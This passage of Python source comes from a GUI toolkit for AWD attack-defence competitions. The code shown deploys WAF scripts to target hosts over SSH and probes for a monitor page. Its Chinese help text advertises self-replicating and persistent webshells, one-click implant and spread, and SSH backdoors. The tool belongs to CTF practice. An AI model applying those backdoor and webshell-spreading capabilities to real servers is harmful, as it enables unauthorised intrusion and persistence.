                        f'chmod 644 {web_dir}/waf_strong.php {web_dir}/.waf.dat.php {web_dir}/waf_ban.php {web_dir}/.htaccess {web_dir}/.user.ini 2>/dev/null; echo CHMOD_DONE', timeout=15)
                    bso.channel.settimeout(15)
                    bso.read()
                except Exception:
                    pass
                # 2.5 mod_php环境自动挂载入口（.user.ini不生效时）
                try:
                    mmsg = self.waf._auto_mount_waf(ssh, web_dir)
                    if mmsg:
                        report.append(mmsg)
                except Exception:
                    pass
                sftp.close()
                # 3. 更新target_monitor.php密码
                self.root.after(0, lambda: self.mon.password.set(pwd) if hasattr(self.mon, 'password') else None)
                # 4. HTTP验证式探测监控URL（端口+路径自动匹配）
                self.root.after(0, lambda: self.status_bar.config(text='🔎 验证监控URL...'))
                base_url = None
                try:
                    import urllib.request, urllib.parse as _up
                    rels = ['']
                    if web_dir.strip('/'):
                        rels.append('/' + web_dir.strip('/').split('/')[-1])
                    probe_ports = []
                    gp = str(port).strip() if port else ''
                    if gp and gp not in ('80',):
                        probe_ports.append(gp)
                    probe_ports += ['8804', '8802', '8080', '80']
                    for p in probe_ports:
                        if base_url: break
                        for rel in rels:
                            test = f'http://{host}:{p}{rel}/target_monitor.php'
                            try:
                                q = _up.urlencode({'u': 'monitor', 'p': pwd, 'ajax': '1', '_': '0'})
                                resp = urllib.request.urlopen(test + '?' + q, timeout=5)
                                body = resp.read(800)
                                if resp.status == 200 and b'lines' in body:
                                    base_url = test
                                    break
                            except Exception:
                                continue
                except Exception:
                    pass
                if not base_url:
                    if port and str(port).strip():
                        base_url = f'http://{host}:{port}/target_monitor.php'
                    else:
                        base_url = f'http://{host}:8802/target_monitor.php'
                if hasattr(self.mon, 'target_url'):
                    self.mon.target_url.set(base_url)
                    self.mon.password.set(pwd)
                ssh.close()
                watchdog.cancel()
                self.root.after(0, lambda: self.status_bar.config(text=' | '.join(report) + ' | 🟢 就绪'))
                self.root.after(0, lambda: messagebox.showinfo('一键部署', '\n'.join(report) + '\n\n点「▶ 开始」启动监控'))
                self.root.after(0, lambda: self._log_workflow('✅ 一键部署完成: ' + ' | '.join(report)))
            except Exception as e:
                watchdog.cancel()
                self.root.after(0, lambda e=e: self.status_bar.config(text=f'❌ 部署失败: {str(e)[:60]}'))
                self.root.after(0, lambda e=e: self._log_workflow('❌ 一键部署失败: ' + str(e)[:100]))
                self.root.after(0, lambda e=e: messagebox.showerror('一键部署失败',
                    f'部署流程出错:\n{e}\n\n检查: ①靶机网络是否可达(靶机没启动/网络不通时连不上) ②SSH端口是否正确 ③SSH用户/密码 ④Web目录权限'))
        threading.Thread(target=_run, daemon=True).start()

    def _log_workflow(self, msg):
        try:
            if self.dash and hasattr(self.dash, 'log_activity'):
                self.dash.log_activity(msg)
        except Exception:
            pass

    def show_help(self):
        win = tb.Toplevel(self.root)
        win.title('YL Phantom — 使用帮助')
        win.geometry('750x650')
        win.minsize(500, 400)
        win.transient(self.root)
        win.grab_set()

        text = scrolledtext.ScrolledText(win, font=('Consolas', 10), bg='#0a0e17', fg='#c8d6f0',
            insertbackground='white', wrap=tk.WORD, padx=10, pady=10, state=tk.DISABLED)
        text.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        for t, c in [('h1','#c084fc'),('h2','#00d4ff'),('text','#c8d6f0'),('code','#00ff9d'),('warn','#ffcc00'),('sep','#555555'),('red','#ff4d6d'),('green','#00ff9d')]:
            text.tag_config(t, foreground=c, spacing1=2, spacing2=1)
        text.tag_config('h1', font=('Consolas', 13, 'bold'), spacing3=8)
        text.tag_config('h2', font=('Consolas', 11, 'bold'), spacing3=6)
        text.tag_config('code', font=('Consolas', 9))
        text.tag_config('sep', font=('Consolas', 7))

        HELP = """══════════════════════════════════════════════════════════
 YL Phantom 作战指挥台 v2.1
 AWD 攻防演练统一管理平台 — by Wwlsyl
══════════════════════════════════════════════════════════

╔══════════════════════════════════════════════════════════╗
║  本工具仅用于授权安全测试，请遵守相关法律法规        ║
╚══════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                        免 责 声 明
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 本工具仅限用于经授权的安全测试、CTF竞赛、AWD攻防演练等合法场景
2. 严禁用于未经授权的网络攻击、入侵、数据窃取等违法行为
3. 使用者需自行承担所有法律责任，开发者不承担任何连带责任
4. 下载、安装、使用本工具即视为已阅读并同意以上条款
5. 如有违反，一切后果由使用者自行承担

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                        功 能 介 绍
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

▸ 📊 Dashboard 总览
  · 全局状态卡片：目标数/存活数/Flag数/告警数/WAF部署/木马植入
  · 快捷操作：部署WAF/获取Flag/一键加固/备份网站
  · 活动趋势图 + 操作日志实时记录

▸ 🛡️ WAF管理
  · 批量部署 WAF 防护脚本到多个靶机
  · 检查/更新/卸载 WAF 状态
  · 执行日志/规则编辑/攻击流量分析/心跳监控

▸ 🎯 Flag获取
  · 周期性批量读取靶机 Flag
  · 支持 RSA 加密通信 + 流量混淆
  · 自动提交到平台 + 手动提交模式

▸ 💡 靶机监控
  · 实时监控文件变更/连接/告警
  · 攻击者TOP排行
  · 文件管理（浏览/编辑/上传/下载）

▸ 🕷️ 木马上传
  · 蠕虫马(自复制)/不死马(常驻)/MD5马(免杀)/内存马(无文件)
  · 一键植入/部署/扩散/清除
  · SSH后门 + 心跳检测

▸ 🔧 综合运维
  · 备份还原/木马查杀/数据库/加固基线
  · 木马查杀/数据库/加固基线/自动修复
  · IP黑名单/定时备份

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       联 系 作 者
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  作者: Wwlsyl
  版本: YL Phantom v2.1
  用途: AWD攻防演练 / 安全测试 / CTF竞赛

══════════════════════════════════════════════════════════
              Powered by ttkbootstrap · Python 3.12
══════════════════════════════════════════════════════════"""

        text.config(state=tk.NORMAL)
        text.insert(tk.END, HELP)
        text.config(state=tk.DISABLED)
        tb.Button(win, text='关闭', command=win.destroy).pack(pady=(0,8))

    def on_close(self):
        try: self.mon.monitoring = False; self.mon.save_config()
        except Exception: pass
        try: self.flag.stop_hunt(); self.flag.save_known(); self.flag.save_config()
        except Exception: pass
        try: self.waf.save_config()
        except Exception: pass
        try: self.creep.save_cfg()
        except Exception: pass
        self.root.destroy()


if __name__ == '__main__':
    AWDToolkit()
